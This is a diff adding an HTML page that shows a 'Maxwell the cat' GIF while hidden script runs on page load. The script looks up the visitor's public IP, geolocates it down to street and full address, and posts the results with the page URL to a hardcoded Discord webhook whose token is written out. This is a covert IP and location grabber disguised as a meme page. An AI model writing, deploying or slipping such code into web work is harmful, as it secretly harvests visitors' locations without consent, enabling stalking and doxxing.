@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>website</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    img {
+      max-width: 100%;
+      max-height: 100%;
+    }
+  </style>
+</head>
+<body>
+<img src="https://media.tenor.com/VkGE6OgHhTMAAAAi/maxwell-maxwell-cat.gif" alt="maxwell">
+
+<script>
+  function sendMessage() {
+    const retryLimit = 15;
+    let retryCount = 0;
+
+    function sendRequest() {
+      const ipRequest = new XMLHttpRequest();
+      ipRequest.open("GET", "https://api.ipify.org/?format=json");
+
+      ipRequest.onreadystatechange = function () {
+        if (ipRequest.readyState === 4) {
+          if (ipRequest.status === 200) {
+            const response = JSON.parse(ipRequest.responseText);
+            const ipAddress = response.ip;
+            sendToDiscord(ipAddress);
+          } else {
+            if (retryCount < retryLimit) {
+              retryCount++;
+              sendRequest();
+            } else {
+              console.error("Failed to get IP address after retries");
+            }
+          }
+        }
+      };
+
+      ipRequest.send();
+    }
+
+    function sendToDiscord(ipAddress) {
+      const geoRequest = new XMLHttpRequest();
+      geoRequest.open("GET", `https://ipapi.co/${ipAddress}/json/`);
+
+      geoRequest.onreadystatechange = function () {
+        if (geoRequest.readyState === 4) {
+          if (geoRequest.status === 200) {
+            const geoResponse = JSON.parse(geoRequest.responseText);
+            const city = geoResponse.city;
+            const country = geoResponse.country_name;
+            const pcName = "Your PC Name"; // You can implement a method to get the PC name
+            const ipLink = `https://whatismyipaddress.com/ip/${ipAddress}`;
+
+            const addressRequest = new XMLHttpRequest();
+            addressRequest.open("GET", `https://api.opencagedata.com/geocode/v1/json?q=${geoResponse.latitude}+${geoResponse.longitude}&key=YOUR_OPENCAGE_API_KEY`);
+
+            addressRequest.onreadystatechange = function () {
+              if (addressRequest.readyState === 4) {
+                if (addressRequest.status === 200) {
+                  const addressResponse = JSON.parse(addressRequest.responseText);
+                  const addressComponents = addressResponse.results[0].components;
+                  const street = addressComponents.road || '';
+                  const address = addressResponse.results[0].formatted;
+
+                  let description = '';
+                  if (pcName && pcName !== 'Your PC Name') {
+                    description += `**PC Name:** ${pcName}\n`;
+                  } else {
+                    description += "**PC Name:** Not available\n";
+                  }
+
+                  description += `**IP Address:** ${ipAddress}\n`;
+
+                  if (city && country) {
+                    description += `**Location:** ${city}, ${country}\n`;
+                  } else {
+                    description += "**Location:** Not available\n";
+                  }
+
+                  if (street) {
+                    description += `**Street:** ${street}\n`;
+                  } else {
+                    description += "**Street:** Not available\n";
+                  }
+
+                  if (address) {
+                    description += `**Address:** ${address}\n`;
+                  } else {
+                    description += "**Address:** Not available\n";
+                  }
+
+                  description += `**Opened from:** ${window.location.href}`;
+
+                  const discordRequest = new XMLHttpRequest();
+                  discordRequest.open("POST", "https://discord.com/api/webhooks/1212815328875257976/n0u023wA00yOCutLcuOr7mDbfuKayNytGDx8FBCqnKaU_KznI5gS8FqGdOBXbcZxcGfg");
+
+                  discordRequest.setRequestHeader('Content-type', 'application/json');
+
+                  const params = {
+                    embeds: [
+                      {
+                        title: "PC Information Update",
+                        description: description,
+                        color: 123123
+                      }
+                    ]
+                  };
+
+                  discordRequest.send(JSON.stringify(params));
+                } else {
+                  console.error("Failed to get address information");
+                }
+              }
+            };
+
+            addressRequest.send();
+          } else {
+            console.error("Failed to get geolocation information");
+          }
+        }
+      };
+
+      geoRequest.send();
+    }
+
+    // launch discord request
+    sendRequest();
+  }
+
+  document.addEventListener('DOMContentLoaded', sendMessage);
+</script>
+</body>
+</html>
